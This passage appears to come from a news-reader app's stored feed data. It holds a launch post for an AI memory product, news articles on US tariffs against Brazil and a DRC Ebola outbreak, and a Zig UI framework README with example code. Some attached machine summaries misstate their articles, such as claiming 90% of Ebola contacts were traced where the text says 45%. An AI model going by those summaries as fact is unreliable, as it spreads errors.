leaves the agent working from partial information; (3) And even if it had everything, it doesn't do the meta-reasoning required to do a great job. If you paste in a Notion doc and it won't learn your design taste or your writing style unless you tell it to, and it won't know why a decision was made or when. As undergrads 5 years ago, we were into the tools-for-thought wave and became power users of Notion, Obsidian, Roam, Anki, real believers in building a second brain. After GPT-3.5 came out we started to realize how much more powerful that second brain could be if an AI could actually read it, because suddenly it would know our backstory, our taste, our preferences, and unlock genuinely new capabilities. That’s why we’re building Hyper. We know it’s not for everybody! But for people who do want to be on the cutting edge, this is a force multiplier that makes agents faster and better. It increases the number of tasks they can do, and how effectively they do them. Hyper works by ingesting everything you give it access to, Docs, Slack, Email, Calendar, Granola, and synthesizes it into a knowledge graph of facts and their relationships with embeddings for semantic search. The memory system we’ve built is hybrid, with two modalities. Episodes are the raw source items kept as the source of truth. Facts are the meaning pulled out of each episode, stored as subject-predicate-object records with a plain summary and timestamps for when the fact was introduced and when it was invalidated (subject=person, predicate=works_at, object=company). Facts form a graph with typed edges between them: X is in tension with Y, A is derived from B, J supersedes K. Every time a new fact comes in we update the facts in its neighborhood, so the graph stays current, and that's how we handle stale information. When "we'll ship Friday" is later contradicted by "we're shipping Monday," the new fact supersedes the old one instead of both looking equally true, and we never auto-discard the superseded version, so you can still ask how you landed on Monday. Every fact carries provenance back to its source and access-control tags for who is allowed to see it. At retrieval we query-expand, then fuse semantic search over embeddings with Postgres full-text search using reciprocal rank fusion, and we only ever evaluate a query against the facts and episodes that person has access to, which means two people on the same team can ask the same question and get different answers. We keep information fresh with webhooks where they exist and polling where they don't, hashing contents to catch changes for sources that don’t handle native dedupe. Agents read and write through two paths: lifecycle hooks in tools like Claude Code, Cowork, Codex, and Cursor, where we inject relevant context on every prompt and pull interesting facts out of every response, and plain MCP tool calls for everything that doesn't expose hooks. We love it! and so do our early users: one CEO uses Hyper to draft emails in his voice with full company context. What took hours/week now takes minutes and gets sharper each time Hyper learns more how he thinks and how his company is changing. One YC founder one-shotted a launch video script because Hyper already knew their product, voice, positioning accumulated over months. We have a 3-day free trial, explained more on our pricing page ( https://heyhyper.ai/pricing ) and there are more details in our FAQ ( https://heyhyper.ai/faq ), including things like privacy, compliance, and how we’re different from other “memory” companies.. Give it a spin! break it! and tell us where it falls short: https://heyhyper.ai/ . We'd love to build you a 10-star experience :) Comments welcome! Comments URL: https://news.ycombinator.com/item?id=48387095 Points: 8 # Comments: 0`,summary:`Hyper (YC P26) is a shared "company brain" that plugs into information inside a company to improve AI agents and automations. The team, Shalin and Kanyes, are founders who built Hyper to make the first step of AGi development by ingesting all information needed for an agent's work from its source (such as documents, Slack threads, and company data). They believe that smart enough models often lack context about a company's internal workings. The team also believes that there is no single "notion" or language model capable of understanding a full story, so Hyper provides both raw information from sources like Notion and a knowledge graph to help the agent with its work. Hyper integrates these inputs to create an AI-powered environment in which an agent can learn quickly and more effectively than before.
+
+• Shalin and Kanyes are founders of Hyper (YC P26).
+• Hyper is a "company brain" that plugs into information inside a company for improved AI agents and automations.
+• The team, including Shalin and Kanyes, built Hyper to make the first step of AGi development by ingesting all information needed for an agent's work from its source (such as documents, Slack threads, and company data).
+• They believe that smart enough models often lack context about a company's internal workings.
+• There is no single "notion" or language model capable of understanding a full story.`,summary_model:`qwen2.5:0.5b`,published_at:1780508393,fetched_at:1780509343,content_hash:`5a8f0f53341a40b8e07417b7df15df54513fd9fcf5aabb1d1174f59507262985`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:29,feed_id:11,guid:`https://www.aljazeera.com/?t=1780497599`,url:`https://www.aljazeera.com/news/2026/6/3/lula-says-brazil-cannot-accept-treatment-after-new-us-tariffs-proposed?traffic_source=rss`,title:`Lula says Brazil cannot ‘accept treatment’ after new US tariffs proposed`,content_html:`<div id="readability-page-1" class="page"><div><p><em>Brazil’s president says he was surprised by the proposed 25 percent tariffs, which came amid signs of improving relations.</em></p></div><div aria-live="polite" aria-atomic="true"><p>Brazilian President Luiz Inacio Lula da Silva has decried newly proposed United States tariffs, saying he could “not accept the treatment” his country had received.</p><p>The rebuke on Wednesday came a day after the administration of US President Donald Trump announced the 25 percent tariff on certain Brazilian imports, appearing to roll back an emerging detente between the two countries.</p><section><h2>Recommended Stories </h2><span>list of 3 items</span><ul><li><span>list 1 of 3</span><a href="https://www.aljazeera.com/news/2026/5/27/brazils-flavio-bolsonaro-meets-with-trump-amid-troubled-presidential-bid">Brazil’s Flavio Bolsonaro meets with Trump amid troubled presidential bid</a></li><li><span>list 2 of 3</span><a href="https://www.aljazeera.com/news/2026/5/29/us-to-designate-two-brazilian-gangs-as-terrorist-organisations">US to designate two Brazilian gangs as ‘terrorist’ organisations</a></li><li><span>list 3 of 3</span><a href="https://www.aljazeera.com/news/2026/5/29/a-landmark-brazils-prosecutors-hail-court-ruling-to-preserve-fordlandia">‘A landmark’: Brazil’s prosecutors hail court ruling to preserve Fordlandia</a></li></ul><span>end of list</span></section><p>Lula said he had left a May meeting at the White House with Trump optimistic that relations were improving.</p><p>During the first year of Trump’s second term, which began on January 20, 2025, the two leaders had butted heads over issues of trade, human rights and politics.</p><p>Lula, a longtime left-wing leader, quickly emerged as a key critic of the second Trump administration’s aggressive approach to Latin America, including his <a href="https://www.aljazeera.com/news/2026/1/3/explosions-heard-over-venezuelan-capital-caracas-amid-us-tensions">January 3 attack</a> on Venezuela and the <a href="https://www.aljazeera.com/news/2025/9/8/brazils-lula-says-us-warships-in-caribbean-are-a-source-of">increasing US military presence</a> in the Caribbean Sea.</p><p>Trump, meanwhile, has attacked the Brazilian government for allegedly censoring right-wing voices. The US leader has close connections to former Brazilian President Jair Bolsonaro and his family, prominent figures in Brazil’s far right.</p><p>Last year, after federal prosecutors brought Bolsonaro to trial for attempting to subvert Brazil’s democracy, Trump responded by imposing several rounds of tariffs on Brazil, reaching 50 percent on many goods.</p><p>Bolsonaro was ultimately convicted and sentenced to 27 years in prison for efforts to overturn his 2022 election defeat to Lula.</p><p>On Wednesday, Lula said he was surprised by the newly proposed tariffs, adding that US-Brazil trade talks were still ongoing. He added that Brazil still wanted to build institutional relations with the US but would seek other trade partners if needed.</p><p>Speaking on Tuesday, US Trade Representative Jamieson Greer said the latest tariff proposal follows an investigation into alleged unfair trade practices.</p><p>The probe focused on issues including illegal deforestation, ethanol market access and anticorruption enforcement, according to a summary. It concluded that the trade practices between the two nations “are unreasonable and burden or restrict US commerce”.</p><p>Speaking on CNBC, Greer also pointed to a “giant” trade deficit between the US and Brazil.</p><p>However, public data contradicts the claim, instead showing that the US <a href="https://www.aljazeera.com/economy/2025/7/10/whats-behind-trumps-50-percent-tariff-for-brazil-despite-trade-surplus" rel="noopener" target="_blank">maintains a trade surplus</a>\xA0with Brazil.</p><p>For example, in March, Brazil bought more goods from the US than it exported, representing a $420m trade surplus.</p><p>Experts have said the Trump administration appears to be pursuing a new strategy for tariffs after the US Supreme Court in February struck down the White House’s sweeping global tariffs, imposed under the International Emergency Economic Powers Act (IEEPA).</p><p>The new tariffs are instead imposed under Section 301 of US trade policy. The statute gives the US government broad authority to impose trade sanctions based on alleged violations of trade agreements.</p><p>Under the Trade Act of 1974, it also allows for the imposition of penalties for trade practices deemed “unfair”.</p><p>The latest round of tariffs against Brazil will be subject to a public comment period, which ends in early July.</p><p>Several key Brazilian products are exempt from the new tariffs, including beef, coffee, rare earths, other metals, energy and aircraft parts.</p><p>The latest tariff proposal comes as Lula is facing a tight race for re-election in November, against Bolsonaro’s eldest son, Senator Flavio Bolsonaro.</p></div></div>`,content_text:`Brazil’s president says he was surprised by the proposed 25 percent tariffs, which came amid signs of improving relations.Brazilian President Luiz Inacio Lula da Silva has decried newly proposed United States tariffs, saying he could “not accept the treatment” his country had received.The rebuke on Wednesday came a day after the administration of US President Donald Trump announced the 25 percent tariff on certain Brazilian imports, appearing to roll back an emerging detente between the two countries.Recommended Stories list of 3 itemslist 1 of 3Brazil’s Flavio Bolsonaro meets with Trump amid troubled presidential bidlist 2 of 3US to designate two Brazilian gangs as ‘terrorist’ organisationslist 3 of 3‘A landmark’: Brazil’s prosecutors hail court ruling to preserve Fordlandiaend of listLula said he had left a May meeting at the White House with Trump optimistic that relations were improving.During the first year of Trump’s second term, which began on January 20, 2025, the two leaders had butted heads over issues of trade, human rights and politics.Lula, a longtime left-wing leader, quickly emerged as a key critic of the second Trump administration’s aggressive approach to Latin America, including his January 3 attack on Venezuela and the increasing US military presence in the Caribbean Sea.Trump, meanwhile, has attacked the Brazilian government for allegedly censoring right-wing voices. The US leader has close connections to former Brazilian President Jair Bolsonaro and his family, prominent figures in Brazil’s far right.Last year, after federal prosecutors brought Bolsonaro to trial for attempting to subvert Brazil’s democracy, Trump responded by imposing several rounds of tariffs on Brazil, reaching 50 percent on many goods.Bolsonaro was ultimately convicted and sentenced to 27 years in prison for efforts to overturn his 2022 election defeat to Lula.On Wednesday, Lula said he was surprised by the newly proposed tariffs, adding that US-Brazil trade talks were still ongoing. He added that Brazil still wanted to build institutional relations with the US but would seek other trade partners if needed.Speaking on Tuesday, US Trade Representative Jamieson Greer said the latest tariff proposal follows an investigation into alleged unfair trade practices.The probe focused on issues including illegal deforestation, ethanol market access and anticorruption enforcement, according to a summary. It concluded that the trade practices between the two nations “are unreasonable and burden or restrict US commerce”.Speaking on CNBC, Greer also pointed to a “giant” trade deficit between the US and Brazil.However, public data contradicts the claim, instead showing that the US maintains a trade surplus\xA0with Brazil.For example, in March, Brazil bought more goods from the US than it exported, representing a $420m trade surplus.Experts have said the Trump administration appears to be pursuing a new strategy for tariffs after the US Supreme Court in February struck down the White House’s sweeping global tariffs, imposed under the International Emergency Economic Powers Act (IEEPA).The new tariffs are instead imposed under Section 301 of US trade policy. The statute gives the US government broad authority to impose trade sanctions based on alleged violations of trade agreements.Under the Trade Act of 1974, it also allows for the imposition of penalties for trade practices deemed “unfair”.The latest round of tariffs against Brazil will be subject to a public comment period, which ends in early July.Several key Brazilian products are exempt from the new tariffs, including beef, coffee, rare earths, other metals, energy and aircraft parts.The latest tariff proposal comes as Lula is facing a tight race for re-election in November, against Bolsonaro’s eldest son, Senator Flavio Bolsonaro.`,summary:`Brazil's President Luiz Inacio Lula da Silva has been critical of the proposed 25 percent tariffs from the United States on certain Brazilian imports. He says he "could not accept" the treatment his country had received and is open to other trade partners if needed.`,summary_model:`qwen2.5:0.5b`,image_url:`https://www.aljazeera.com/wp-content/uploads/2026/06/afp_6a2047d6efdb-1780500439.jpg?resize=1920%2C1440`,published_at:1780508171,fetched_at:1780509343,content_hash:`8ca62659c1c7676da436ac273bae1e357559afe58d5c9899d5070f70df97607d`,tags:`News`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:56,feed_id:12,guid:`https://www.theguardian.com/global-development/2026/jun/03/drc-ebola-outbreak-could-have-begun-as-early-as-january-who-chief-says`,url:`https://www.theguardian.com/global-development/2026/jun/03/drc-ebola-outbreak-could-have-begun-as-early-as-january-who-chief-says`,title:`DRC Ebola outbreak could have begun as early as January, WHO chief says`,author:`Kat Lay Global health correspondent`,content_html:`<div id="readability-page-1" class="page"><div id="maincontent"><p>The Ebola outbreak in the <a data-component="auto-linked-tag" data-link-name="in body link" href="https://www.theguardian.com/world/congo">Democratic Republic of the Congo</a> could have begun as early as January, the head of the World Health Organization said, giving the virus “a big head start”.</p><p>Dr Tedros Adhanom Ghebreyesus also said the response was being hindered by blanket travel restrictions and highlighted high levels of community mistrust and low levels of contact tracing as key concerns.</p><p>Since the outbreak was identified in mid-May, the Bundibugyo virus has caused 344 confirmed <a data-component="auto-linked-tag" data-link-name="in body link" href="https://www.theguardian.com/world/ebola">Ebola</a> cases including 60 deaths in DRC, and 15 confirmed cases including one death in neighbouring Uganda.</p><p>“The outbreak had a big head start, and we’re still behind” but the response was catching up, Tedros said, with treatment centres now established across Ituri province, the most affected part of DRC.</p><p>He called on countries that have imposed blanket travel restrictions, such as the US, to lift them. They “are disrupting supply chains and hindering the response”, he said.</p><p>Contact tracing, a key element of the response to any infectious disease outbreak, is being made particularly difficult by insecurity and displacement in Ituri, he said, with only about 45% of contacts followed up.</p><p>“To get ahead of the outbreak we need to get that number up to above 90%,” he said.</p><p>The number of suspected cases in DRC fell abruptly on Tuesday from more than 1,000 to 116, as officials worked through a testing backlog to either confirm them or rule them out.</p><figure data-spacefinder-role="inline" data-spacefinder-type="model.dotcomrendering.pageElements.NewsletterSignupBlockElement"><gu-island name="EmailSignUpWrapper" priority="feature" deferuntil="visible" props="{&#34;index&#34;:8,&#34;listId&#34;:4146,&#34;identityName&#34;:&#34;global-dispatch&#34;,&#34;category&#34;:&#34;article-based&#34;,&#34;description&#34;:&#34;Get a different world view with a roundup of the best news, features, opinion and photography, curated by our global development team&#34;,&#34;name&#34;:&#34;Global Dispatch&#34;,&#34;frequency&#34;:&#34;Every fortnight&#34;,&#34;successDescription&#34;:&#34;We&#39;ll send you Global Dispatch every fortnight&#34;,&#34;theme&#34;:&#34;news&#34;,&#34;illustrationSquare&#34;:&#34;https://media.guim.co.uk/16ef1e389824faca96915aa70b12d2bbe9a5082d/1579_0_2998_3000/2998.jpg&#34;,&#34;exampleUrl&#34;:&#34;/email/global-dispatch&#34;,&#34;idApiUrl&#34;:&#34;https://idapi.theguardian.com&#34;,&#34;hideNewsletterSignupComponentForSubscribers&#34;:true,&#34;showNewNewsletterSignupCard&#34;:true}"></gu-island></figure><figure id="fc88f787-2a4b-4d24-bc40-52c77409726c" data-spacefinder-role="richLink" data-spacefinder-type="model.dotcomrendering.pageElements.RichLinkBlockElement"><gu-island name="RichLinkComponent" priority="feature" deferuntil="idle" props="{&#34;richLinkIndex&#34;:9,&#34;element&#34;:{&#34;_type&#34;:&#34;model.dotcomrendering.pageElements.RichLinkBlockElement&#34;,&#34;prefix&#34;:&#34;Related: &#34;,&#34;text&#34;:&#34;Burials and tears as Ebola outbreak continues to spread in DRC – in pictures&#34;,&#34;elementId&#34;:&#34;fc88f787-2a4b-4d24-bc40-52c77409726c&#34;,&#34;role&#34;:&#34;richLink&#34;,&#34;url&#34;:&#34;https://www.theguardian.com/world/gallery/2026/may/29/ebola-outbreak-drc-in-pictures&#34;},&#34;ajaxUrl&#34;:&#34;https://api.nextgen.guardianapps.co.uk&#34;,&#34;format&#34;:{&#34;design&#34;:0,&#34;display&#34;:0,&#34;theme&#34;:0}}"></gu-island></figure><p>Tedros said it was a key priority to scale up laboratory and diagnostic capacity in the most affected areas as well as neighbouring provinces and countries.</p><p>The first identified case in the outbreak was a nurse who went to a health centre on 24 April, but Tedros said there were alternative scenarios.</p><p>“It could be January, it could be February, March, April,” he said. “But I think the focus now should be on the response.”</p><p>Mistrust was a serious barrier, he said, with some community leaders telling him during a visit to DRC last week that they did not believe Ebola was real. He said they also worried that the response would take resources away from other vital services.</p><p>There is currently no vaccine or treatment for the Bundibugyo strain of the virus, but Tedros said the recovery of six people in DRC and two in Uganda showed that people could survive Ebola if they had access to care and went to health facilities as soon as they showed symptoms.</p><p>The UK’s Foreign, Commonwealth and Development Office has announced the launch of multi-hazard research network through which experts from the UK and international partners could provide rapid advice and evidence on emerging infectious diseases and other crises, including the current Ebola outbreak.</p></div></div>`,content_text:`The Ebola outbreak in the Democratic Republic of the Congo could have begun as early as January, the head of the World Health Organization said, giving the virus “a big head start”.Dr Tedros Adhanom Ghebreyesus also said the response was being hindered by blanket travel restrictions and highlighted high levels of community mistrust and low levels of contact tracing as key concerns.Since the outbreak was identified in mid-May, the Bundibugyo virus has caused 344 confirmed Ebola cases including 60 deaths in DRC, and 15 confirmed cases including one death in neighbouring Uganda.“The outbreak had a big head start, and we’re still behind” but the response was catching up, Tedros said, with treatment centres now established across Ituri province, the most affected part of DRC.He called on countries that have imposed blanket travel restrictions, such as the US, to lift them. They “are disrupting supply chains and hindering the response”, he said.Contact tracing, a key element of the response to any infectious disease outbreak, is being made particularly difficult by insecurity and displacement in Ituri, he said, with only about 45% of contacts followed up.“To get ahead of the outbreak we need to get that number up to above 90%,” he said.The number of suspected cases in DRC fell abruptly on Tuesday from more than 1,000 to 116, as officials worked through a testing backlog to either confirm them or rule them out.Tedros said it was a key priority to scale up laboratory and diagnostic capacity in the most affected areas as well as neighbouring provinces and countries.The first identified case in the outbreak was a nurse who went to a health centre on 24 April, but Tedros said there were alternative scenarios.“It could be January, it could be February, March, April,” he said. “But I think the focus now should be on the response.”Mistrust was a serious barrier, he said, with some community leaders telling him during a visit to DRC last week that they did not believe Ebola was real. He said they also worried that the response would take resources away from other vital services.There is currently no vaccine or treatment for the Bundibugyo strain of the virus, but Tedros said the recovery of six people in DRC and two in Uganda showed that people could survive Ebola if they had access to care and went to health facilities as soon as they showed symptoms.The UK’s Foreign, Commonwealth and Development Office has announced the launch of multi-hazard research network through which experts from the UK and international partners could provide rapid advice and evidence on emerging infectious diseases and other crises, including the current Ebola outbreak.`,summary:`The Democratic Republic of Congo (DRC) Ebola outbreak had a "big head start" as identified by Tedros Adhanom Ghebreyesus, WHO’s chief health official. The response was being hindered by blanket travel restrictions and community mistrust. Treatments were established across Ituri province, with 90% of contacts followed up. Experts are working to scale up laboratory and diagnostic capacity in affected areas. Trust issues had been a barrier, but the UK Foreign, Commonwealth and Development Office is launching a new research network.`,summary_model:`qwen2.5:0.5b`,image_url:`https://i.guim.co.uk/img/media/d095acf79ca4526bfd57f0148ba95b8c04715243/1056_193_2544_2034/master/2544.jpg?width=1200&height=630&quality=85&auto=format&fit=crop&precrop=40:21,offset-x50,offset-y0&overlay-align=bottom%2Cleft&overlay-width=100p&overlay-base64=L2ltZy9zdGF0aWMvb3ZlcmxheXMvdGctZGVmYXVsdC5wbmc&enable=upscale&s=311b292569612c26d96a5c361bbf79de`,published_at:1780507795,fetched_at:1780509343,content_hash:`94a48cb1252b4b76c4fc8c01418a97413bbf89b3d1db2eac0456350eee54c0db`,tags:`Global development, Ebola, Democratic Republic of the Congo`,is_read:!1,is_starred:!0,is_later:!1,dup_count:0},{id:60,feed_id:1,guid:`https://news.ycombinator.com/item?id=48386725`,url:`https://github.com/duanebester/gooey`,title:`Gooey: A GPU-accelerated UI framework for Zig`,author:`ksec`,content_html:`<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text">
+<p dir="auto">A GPU-accelerated UI framework for Zig, targeting macOS (Metal), Linux (Vulkan/Wayland), and Browser (WASM/WebGPU).</p>
+<p dir="auto">Join the <a href="https://discord.gg/bmzAZnZJyw" rel="nofollow">Gooey discord</a></p>
+<p dir="auto"><a href="https://github.com/duanebester/gooey/blob/main/assets/gooey-logo-final.png" rel="noopener noreferrer" target="_blank"><img src="https://github.com/duanebester/gooey/raw/main/assets/gooey-logo-final.png" height="100px"/></a></p>
+<blockquote>
+<p dir="auto"><strong>Early Development</strong>: API is evolving.</p>
+</blockquote>
+<p dir="auto"><a href="https://github.com/duanebester/gooey/actions/workflows/ci.yml"><img src="https://github.com/duanebester/gooey/actions/workflows/ci.yml/badge.svg?branch=main" alt="CI"/></a></p>
+<p dir="auto">Example app built with Gooey — <a href="https://github.com/duanebester/chat-zig"><strong>chat-zig</strong></a>, an Anthropic Claude client using the Zig 0.16 <code>std.Io</code> stack for async HTTP:</p>
+<a href="https://github.com/duanebester/chat-zig">
+  <img src="https://github.com/duanebester/gooey/raw/main/assets/screenshots/chat-zig.png" height="360px"/>
+</a>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a aria-label="Permalink: Features" href="#features" id="user-content-features"></a></p>
+<ul dir="auto">
+<li><strong>GPU Rendering</strong> - Metal (macOS), Vulkan (Linux) with MSAA anti-aliasing (WebGPU/WASM is blocked upstream on Zig 0.16 — see <a href="#wasm">WASM</a>)</li>
+<li><strong>Declarative UI</strong> - Component-based layout with <code>ui.*</code> primitives and flexbox-style system</li>
+<li><strong>Cx/UI Separation</strong> - <code>Cx</code> for state, handlers, and focus; <code>ui.*</code> for layout primitives</li>
+<li><strong>Pure State Pattern</strong> - Testable state methods with automatic re-rendering</li>
+<li><strong>Animation System</strong> - Built-in animations with easing, <code>animateOn</code> triggers</li>
+<li><strong>Entity System</strong> - Dynamic entity creation/deletion with auto-cleanup</li>
+<li><strong>Retained Widgets</strong> - TextInput, TextArea, Checkbox, Scroll containers</li>
+<li><strong>Text Rendering</strong> - CoreText (macOS), FreeType/HarfBuzz (Linux), Canvas (WASM)</li>
+<li><strong>Custom Shaders</strong> - Drop in your own Metal/GLSL shaders</li>
+<li><strong>Drag &amp; Drop</strong> - Type-safe drag sources and drop targets with <code>pointer_events</code> control</li>
+<li><strong>Liquid Glass</strong> - macOS 26.0+ Tahoe transparent window effects</li>
+<li><strong>Actions &amp; Keybindings</strong> - Contextual action system with keymap</li>
+<li><strong>Theming</strong> - Built-in light/dark mode support</li>
+<li><strong>Images &amp; SVG</strong> - Load images and render SVG icons with styling</li>
+<li><strong>File Dialogs</strong> - Native file open/save dialogs (macOS, Linux, WASM)</li>
+<li><strong>Clipboard</strong> - Native clipboard support on all platforms</li>
+<li><strong>IME Support</strong> - Input method editor for international text input</li>
+<li><strong>Accessibility</strong> - Built-in screen reader support (VoiceOver, Orca, ARIA) with semantic roles and live regions</li>
+<li><strong>Zero Dependencies</strong> - No external Zig packages; builds against system frameworks/libraries only (the Objective-C runtime bindings are vendored in-tree)</li>
+</ul>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Quick Start</h2><a aria-label="Permalink: Quick Start" href="#quick-start" id="user-content-quick-start"></a></p>
+<p dir="auto"><strong>Requirements:</strong> Zig 0.16.0+</p>
+<p dir="auto"><strong>Dependencies:</strong> None. Gooey has zero external Zig package dependencies — <code>build.zig.zon</code> lists no dependencies. It links only against platform system frameworks/libraries (see platform notes below).</p>
+<p dir="auto"><strong>macOS:</strong> macOS 12.0+</p>
+<p dir="auto"><strong>Linux:</strong> Wayland compositor, Vulkan drivers, FreeType, HarfBuzz, Fontconfig, libpng, D-Bus</p>
+<div dir="auto" data-snippet-clipboard-copy-content="zig build run              # Showcase demo
+zig build run-counter      # Counter example
+zig build run-todo         # Todo app (state, handlers, TextInput, lists)
+zig build run-animation    # Animation demo
+zig build run-pomodoro     # Pomodoro timer
+zig build run-glass        # Liquid glass effect
+zig build run-spaceship    # Space dashboard with shader
+zig build run-dynamic-counters  # Entity system demo
+zig build run-layout       # Flexbox, shrink, text wrapping
+zig build run-actions      # Keybindings demo
+zig build run-select       # Dropdown select component
+zig build run-tooltip      # Tooltip component
+zig build run-modal        # Modal dialogs
+zig build run-images       # Image loading and styling
+zig build run-file-dialog  # Native file dialogs
+zig build run-uniform-list # Virtualized list (10k items)
+zig build run-virtual-list # Variable-height list
+zig build run-data-table   # Virtualized table (10k rows)
+zig build run-code-editor  # Code editor with syntax highlighting
+zig build test             # Run tests"><pre>zig build run              <span><span>#</span> Showcase demo</span>
+zig build run-counter      <span><span>#</span> Counter example</span>
+zig build run-todo         <span><span>#</span> Todo app (state, handlers, TextInput, lists)</span>
+zig build run-animation    <span><span>#</span> Animation demo</span>
+zig build run-pomodoro     <span><span>#</span> Pomodoro timer</span>
+zig build run-glass        <span><span>#</span> Liquid glass effect</span>
+zig build run-spaceship    <span><span>#</span> Space dashboard with shader</span>
+zig build run-dynamic-counters  <span><span>#</span> Entity system demo</span>
+zig build run-layout       <span><span>#</span> Flexbox, shrink, text wrapping</span>
+zig build run-actions      <span><span>#</span> Keybindings demo</span>
+zig build run-select       <span><span>#</span> Dropdown select component</span>
+zig build run-tooltip      <span><span>#</span> Tooltip component</span>
+zig build run-modal        <span><span>#</span> Modal dialogs</span>
+zig build run-images       <span><span>#</span> Image loading and styling</span>
+zig build run-file-dialog  <span><span>#</span> Native file dialogs</span>
+zig build run-uniform-list <span><span>#</span> Virtualized list (10k items)</span>
+zig build run-virtual-list <span><span>#</span> Variable-height list</span>
+zig build run-data-table   <span><span>#</span> Virtualized table (10k rows)</span>
+zig build run-code-editor  <span><span>#</span> Code editor with syntax highlighting</span>
+zig build <span>test</span>             <span><span>#</span> Run tests</span></pre></div>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Example</h2><a aria-label="Permalink: Example" href="#example" id="user-content-example"></a></p>
+<p dir="auto">A small todo app that touches a representative slice of the API: a pure,
+UI-free state model; <code>cx.update</code> / <code>cx.updateWith</code> / <code>cx.command</code> handlers; a
+bound <code>TextInput</code>; <code>Checkbox</code> and <code>Button</code>; list iteration; and unit tests that
+exercise the state with no UI in play.</p>
+<p dir="auto">The full, runnable source lives in <a href="https://github.com/duanebester/gooey/blob/main/src/examples/todo.zig"><code>src/examples/todo.zig</code></a>
+(<code>zig build run-todo</code>). Its state model is covered by the tests shown at the
+bottom, which run as part of <code>zig build test</code>.</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const std = @import(&#34;std&#34;);
+const gooey = @import(&#34;gooey&#34;);
+
+const ui = gooey.ui;
+const Cx = gooey.Cx;
+const Button = gooey.components.Button;
+const Checkbox = gooey.components.Checkbox;
+const TextInput = gooey.components.TextInput;
+
+const MAX_TODOS = 64;
+const TEXT_CAP = 128;
+const draft_input_id = &#34;new-todo&#34;;
+
+// State is pure — no UI knowledge, fully testable.
+const Todo = struct {
+    buf: [TEXT_CAP]u8 = [_]u8{0} ** TEXT_CAP,
+    len: usize = 0,
+    done: bool = false,
+
+    fn text(self: *const Todo) []const u8 {
+        return self.buf[0..self.len];
+    }
+};
+
+const Filter = enum { all, active, done };
+
+const AppState = struct {
+    todos: [MAX_TODOS]Todo = [_]Todo{.{}} ** MAX_TODOS,
+    count: usize = 0,
+    draft: []const u8 = &#34;&#34;, // two-way bound to the TextInput
+    filter: Filter = .all,
+
+    // Pure logic — what the tests below drive.
+    fn pushTodo(self: *AppState, value: []const u8) void {
+        const trimmed = std.mem.trim(u8, value, &#34; \\t\\r\\n&#34;);
+        if (trimmed.len == 0) return;
+        if (self.count &gt;= MAX_TODOS) return;
+        const slot = &amp;self.todos[self.count];
+        const n = @min(trimmed.len, TEXT_CAP);
+        @memcpy(slot.buf[0..n], trimmed[0..n]);
+        slot.len = n;
+        slot.done = false;
+        self.count += 1;
+    }
+
+    pub fn toggle(self: *AppState, index: usize) void {
+        if (index &gt;= self.count) return;
+        self.todos[index].done = !self.todos[index].done;
+    }
+
+    pub fn remove(self: *AppState, index: usize) void {
+        if (index &gt;= self.count) return;
+        var i = index;
+        while (i + 1 &lt; self.count) : (i += 1) self.todos[i] = self.todos[i + 1];
+        self.count -= 1;
+    }
+
+    pub fn setFilter(self: *AppState, filter: Filter) void {
+        self.filter = filter;
+    }
+
+    pub fn clearCompleted(self: *AppState) void {
+        var write: usize = 0;
+        var read: usize = 0;
+        while (read &lt; self.count) : (read += 1) {
+            if (!self.todos[read].done) {
+                self.todos[write] = self.todos[read];
+                write += 1;
+            }
+        }
+        self.count = write;
+    }
+
+    fn remaining(self: *const AppState) u32 {
+        var n: u32 = 0;
+        for (self.todos[0..self.count]) |*t| {
+            if (!t.done) n += 1;
+        }
+        return n;
+    }
+
+    fn visible(self: *const AppState, t: *const Todo) bool {
+        return switch (self.filter) {
+            .all =&gt; true,
+            .active =&gt; !t.done,
+            .done =&gt; t.done,
+        };
+    }
+
+    // Command — needs framework access (the binding only flows widget -&gt; state,
+    // so we reach the retained input widget to clear it after adding).
+    pub fn addTodo(self: *AppState, g: *gooey.Window) void {
+        self.pushTodo(self.draft);
+        self.draft = &#34;&#34;;
+        if (g.widgetState(gooey.widgets.TextInputState, draft_input_id)) |input| {
+            input.clear();
+        }
+    }
+};
+
+var state = AppState{};
+
+const App = gooey.App(AppState, &amp;state, render, .{
+    .title = &#34;Todos&#34;,
+    .width = 480,
+    .height = 560,
+});
+
+comptime {
+    _ = App; // Force analysis (also wires @export on WASM).
+}
+
+pub fn main(init: std.process.Init) !void {
+    return App.main(init);
+}
+
+fn render(cx: *Cx) void {
+    const s = cx.state(AppState);
+    const size = cx.windowSize();
+
+    cx.render(ui.box(.{
+        .width = size.width,
+        .height = size.height,
+        .direction = .column,
+        .padding = .{ .all = 24 },
+        .gap = 16,
+        .background = ui.Color.rgb(0.96, 0.96, 0.97),
+    }, .{
+        ui.text(&#34;Todos&#34;, .{ .size = 28 }),
+
+        // Input row: TextInput binds to state.draft; Add is a command.
+        ui.hstack(.{ .gap = 8, .alignment = .center }, .{
+            TextInput{ .id = draft_input_id, .placeholder = &#34;What needs doing?&#34;, .bind = &amp;s.draft, .fill_width = true },
+            Button{ .label = &#34;Add&#34;, .on_click_handler = cx.command(AppState.addTodo) },
+        }),
+
+        // Filters: each button packs its enum value into the handler arg.
+        ui.hstack(.{ .gap = 8 }, .{
+            FilterButton{ .label = &#34;All&#34;, .filter = .all, .active = s.filter == .all },
+            FilterButton{ .label = &#34;Active&#34;, .filter = .active, .active = s.filter == .active },
+            FilterButton{ .label = &#34;Done&#34;, .filter = .done, .active = s.filter == .done },
+        }),
+
+        // The list, or an empty-state hint.
+        ui.when(s.count == 0, .{
+            ui.text(&#34;Nothing yet — add your first todo above.&#34;, .{ .size = 14 }),
+        }),
+        TodoItems{},
+
+        ui.spacer(),
+        ui.hstack(.{ .gap = 12, .alignment = .center }, .{
+            ui.textFmt(&#34;{d} left&#34;, .{s.remaining()}, .{ .size = 14 }),
+            ui.spacer(),
+            Button{ .label = &#34;Clear completed&#34;, .variant = .secondary, .size = .small, .on_click_handler = cx.update(AppState.clearCompleted) },
+        }),
+    }));
+}
+
+// Iteration lives in a component because each row needs \`cx\` for its handlers.
+const TodoItems = struct {
+    pub fn render(_: @This(), cx: *Cx) void {
+        const s = cx.state(AppState);
+        for (s.todos[0..s.count], 0..) |*todo, index| {
+            if (!s.visible(todo)) continue;
+            cx.render(TodoRow{ .index = index, .done = todo.done, .label = todo.text() });
+        }
+    }
+};
+
+const TodoRow = struct {
